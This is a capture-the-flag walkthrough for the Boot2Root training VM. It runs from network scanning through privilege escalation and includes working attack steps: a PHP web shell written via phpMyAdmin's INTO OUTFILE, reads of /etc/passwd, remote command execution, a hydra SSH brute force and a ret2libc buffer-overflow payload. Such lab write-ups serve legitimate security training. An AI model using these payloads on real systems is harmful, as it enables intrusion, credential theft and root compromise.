

# Boot2Root

First, we get the ip address of the `boot2root` machine
```
fping -asgq 192.168.56.0/24
...
192.168.56.112
``` 

After, we launch a `nmap` scan to see the ports and services present on the machine.
```
nmap 192.168.56.112
```

To have more informations about the services we will use the *nmap script engine* with the `-sC` and `-sV` flags:
```
ports=$(nmap 192.168.56.112 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',')
nmap 192.168.56.112 -p$ports -sC -sV
...
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
...
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
...
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
...
143/tcp open  imap       Dovecot imapd
...
443/tcp open  ssl/http   Apache httpd 2.2.22
...
993/tcp open  ssl/imaps?
...

Nmap done: 1 IP address (1 host up) scanned in 94.11 seconds
```

These scans give us more informations and details about each services like the versions or the banners and headers informations etc...
</br>

Let's make a quick analyze on each services:
- The port `21` is a ftp server and doesn't seems to allow anonymous connection
```
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
```

- The port `22` is used by ssh to connect to the machine
```
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
```

- The port `80` is a http web server (Apache)
```
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
```
- The port `143` is an imap server used to retrieve users emails or messages
```
143/tcp open  imap     Dovecot imapd
|_ssl-date: 2025-10-20T09:56:59+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
|_imap-capabilities: LOGINDISABLEDA0001 OK Pre-login STARTTLS have post-login IDLE LOGIN-REFERRALS ENABLE listed capabilities SASL-IR LITERAL+ more IMAP4rev1 ID
```
- The port `443` is a http web server over ssl 
```
443/tcp open  ssl/http Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2025-10-20T09:56:59+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-title: 404 Not Found
```
- The port `993` is an imap server over ssl
```
993/tcp open  ssl/imap Dovecot imapd
|_ssl-date: 2025-10-20T09:56:59+00:00; +1s from scanner time.
|_imap-capabilities: capabilities OK more have post-login IDLE LOGIN-REFERRALS ENABLE listed Pre-login SASL-IR LITERAL+ AUTH=PLAINA0001 IMAP4rev1 ID
```

The most straightforward routes are the web servers. </br>
By accessing the port `80` we are responded by a simple web page, not really interesting ... </br>
By accessing the port `443` we are responded with an error page. </br>
A strategy to see public files and directories from a web site is by making a lot of requests (fuzzing) on differents paths and wait the server's responses. We will use a widely used tool named `ffuf` to enumerates files and directories accessible from the website:
```
ffuf -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u https://192.168.56.112/FUZZ   
...
forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 21ms]
webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 3ms]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 5ms]
```  

We find 3 folders, where each of them are a different application:
- `/forum/`, which is a fourm powered by `mylittleforum`
- `/webmail/` which is a web mail application powered by `squirrelMail` 
- `/phpmyadmin/` which is a `phpmyadmin` instance  


### Mylittleforum

In the `forum` we find an interesting post named `Problem login ?` posted by `lmezard` which seems to be log connections. One line gives us a password:
```
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```
It's the password for `lmezard`, `lmezard:!q\]Ej?*5K5cy*AJ` </br>
These credentials allows us to connect to the `forum` as `lmezard`. In the profile settings we found a mail address: `laurie@borntosec.net` </br>

### SquirrelMail

With the mail and the password `laurie@borntosec.net:!q\]Ej?*5K5cy*AJ` found in the forum, we access to the webmail interface as `laurie`. Once connected we find a mail from `qudevide` giving us the credentials for the database `phpmyadmin`: `root:Fg-'kKXBj87E:aJ$` </br>

### phpmyadmin

On the `phpmyadmin` pannel we see a lot of things, like the `forum` database. An interesting feature of `phpmyadmin` is to make custom `SQL Queries` to the database, as `mysql` user. 
It allows us to read files on the machine like `/etc/passwd`:
```
SELECT LOAD_FILE('/etc/passwd')
```
```
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
```
- Or get configuration files, like the apache2's configuration. It gives us the location of the directories on the machine: `SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default')`
```
<VirtualHost *:443>
ServerAdmin webmaster@localhost
...
Alias /phpmyadmin /usr/share/phpmyadmin
...
Alias /forum /var/www/forum
...
Alias /webmail /usr/share/squirrelmail
...
```
Reading files was actually limited and writing files was even more difficult. After enumerating more on the `/forum` we find a directory:  
```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.112/forum/FUZZ -fs 288
...
templates_c             [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 4ms]
...
```

After some tests, we finally created a malicious php script in this directory with a SQL Query: 
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/script.php'
```
Making a request to the script should execute it:
```
https://192.168.56.112/forum/templates_c/script.php?cmd=whoami
```
It works ! We have now a Remote Code Excution on the machine. </br>

The next step is to found interesting files on the machine. And In the `/home` directory we found the folder `LOOKATME` containing the file `password`:
```
https://192.168.56.112/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
...
lmezard:G!@M6f4Eatau{sF" 
```

### FTP

These credentials are for the ftp account of `lmezard`. Once connected, we found 2 files:
```
ftp> dir
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun

$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

$ file fun          
fun: POSIX tar archive (GNU)
```

### Laurie

The tar archive contains `750` files with the extension `.pcap` but these files are actually `ASCII text` files. </br>
And each of them have the same format, the last line is an index identifying the file order and the rest of the file is the content:
```
$ cat YJR5Z.pcap       
#include <stdio.h>

//file1 
```

With a simple script we can gather the code into a c file, compile and execute it. It gives us a string to cipher with the `SHA256` algorithm to get the ssh's password of `laurie`:
```
$ gcc main.c
$ ./a.out   
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
$ echo -n "Iheartpwnage" | sha256sum         
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

We can now connect to the machine as `laurie` with the creds `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

### Thor    

In the laurie's session we have 2 files:
- `bomb` a 32 binary file
- `README` telling us to deffuse the `bomb` programm to get the ssh password of `thor`

The bomb binary is a serie of 6 challenges:
- Phase 1: Comparizon with a string directly defined in the condition 
```
iVar1 = strings_not_equal(param_1,"Public speaking is very easy.")
```
- Phase 2: find a suite of 6 numbers where the condition `(t[i + 1] = (i + 1) * t[i])` is valid
```
void phase_2(undefined4 param_1)

{
  int index;
  int tab [7];
  
  read_six_numbers(param_1,tab + 1);
  if (tab[1] != 1) {
    explode_bomb();
  }
  index = 1;
  do {
    if (tab[index + 1] != (index + 1) * tab[index]) {
      explode_bomb();
    }
    index = index + 1;
  } while (index < 6);
  return;
}
```
It begins with an array of 7 elements where only 6 of them are assigned. Then a condition is applied on each element. The response:
```
1 2 6 24 120 720
```

- Phase 3: Switch case where the values need to match, we used the hint to find `b` as the second parameter. We have 3 possibilities:
```
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  ...
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break
```
```
1 b 214
2 b 720 
7 b 524
```

- Phase 4: fibonacci suite, a number is asked and it is used to calcul the nth terms of the fibonacci where it's equal to `0x37` (`55`)
```
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) { #55
    explode_bomb();
  }
  return;
}
```

- Phase 5: We read a 6 chars from stdin. From this input line we extract the 4 last bytes of each character and use this value as an index to retrieve a letter from this string `isrveawhobpnutfg`. To deffuse de bomb we need to obtain `giants`

```
void phase_5(int param_1)

{
  int i;
  undefined1 s [6];
  undefined1 l;
  
  i = string_length(param_1);
  if (i != 6) {
    explode_bomb();
  }
  i = 0;
  do {
    s[i] = (&array.123)[(char)(*(byte *)(i + param_1) & 0xf)];
    i = i + 1;
  } while (i < 6);
  l = 0;
  i = strings_not_equal(s,"giants");
  if (i != 0) {
    explode_bomb();
  }
  return;
}
```
We can have multiple differents answers for this one but it need to begin by `o` like the README.

```
local_s = "isrveawhobpnutfg"
local_s[input[0] & 0xf] = local_s[15] = g
local_s[input[1] & 0xf] = local_s[0] = i
15 -> g -> o
0 -> i -> ` 
5 -> a -> e 01100101
11 -> n -> k 01101011
13 -> t -> m 01101101
1 -> s -> a
...
```

- Phase 6: The program have 6 nodes, each one of them have an index and a value. The goal is to sort the nodes by their values and gives their indexes as reponse:
```
0x804b230 <node6>:      0x000001b0      0x00000006      0x0804b23c      0x000000d4
0x804b240 <node5+4>:    0x00000005      0x0804b26c      0x000003e5      0x00000004
0x804b250 <node4+8>:    0x0804b254      0x0000012d      0x00000003      0x0804b260
0x804b260 <node2>:      0x000002d5      0x00000002      0x00000000      0x000000fd
0x804b270 <node1+4>:    0x00000001      0x0804b248      0x000003e9      0x00000000

node6 1b0
node5 d4
node4 3e5
node3 12d
node2 2d5
node1 fd 

3e5 2d5 1b0 12d fd d4
4   2   6   3   1  5 
```

The final result is:
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214 # multiple values possible
9
o`ekma # multiple values possible
4 2 6 3 1 5
```

Joining the strings together doesn't form the right password. Actually the phase 4 can have multiple values and the subject tells something about inversing 2 characters in the end. </br>
Then with a script and hydra we get the password for `thor`:
```
hydra -l thor -P passwds.txt 192.168.56.112 ssh 
...
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

### Zaz

On the `thor` session we have a file `turtle` which is a series of instructions about movements and directions. These instructions are from a graphic library in python named `turtle`. After writing python scripts that draw these instructions we decode the word `SLASH`. </br>
We tried different hash algorithm and found the password for `zaz`:
```
echo -n "SLASH" | md5sum
ssh zaz@192.168.56.103 
password : 646da671ca01bb5d84dbb5fb2238dc8e
```  

## Buffer overflow 

On the `zaz`'s session we find the file `exploit_me` which is a 32-bit ELF file with a SUID. After opening it in Ghidra we found this pseudo code:
```
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```  
Our input is copied in a buffer of 140 bytes with `strcpy` making it vulnerable to buffer overflow because of the lack of size boundaries. We can overwrite the return address of the function of `main` like a `ret2libc` (system + exit + "/bin/sh").
```
gdb exploit_me
(gdb) disas main
(gdb) b 0x08048420
(gdb) r test
(gdb) info function system 
0xb7e6b060  system

(gdb) info function exit
0xb7e5ebe0  exit

(gdb) info proc map 
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so

(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58

(gdb) r $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
```